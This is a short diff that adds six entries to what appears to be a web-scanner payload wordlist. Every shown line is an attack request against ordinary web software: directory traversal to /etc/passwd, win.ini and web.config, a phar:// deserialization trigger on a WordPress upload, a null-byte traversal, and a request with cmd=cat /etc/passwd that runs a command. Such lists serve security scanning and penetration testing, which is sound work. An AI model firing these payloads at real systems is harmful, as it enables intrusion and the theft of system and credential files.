@@ -862,3 +862,9 @@
 /..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
 /../../../../../../windows/win.ini
 /cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd
+/admin/reports/custom-report/download-csv?exportFile=../../../../../../../../../../../../../../../etc/passwd
+/index.php?sgpb_type=phar://wp-content/uploads/2021/12/1.zip/
+/error?StatusCode=404&file=~/web.config
+/view/theme/redbasic/php/style.pcss?f=&puid=2&schema=../../../../shell&v=7.1.6&cmd=cat%20/etc/passwd
+/ViewSource/?file=de/robv/android/xposed/installer/repo/RepoDb.java&md5=36570c6fac687ffe08107e6a72bd3da7/../../../../../../../../../../../private/etc/passwd%00&type=apk
+/cities?country=/../../../../../../../../etc/passwd
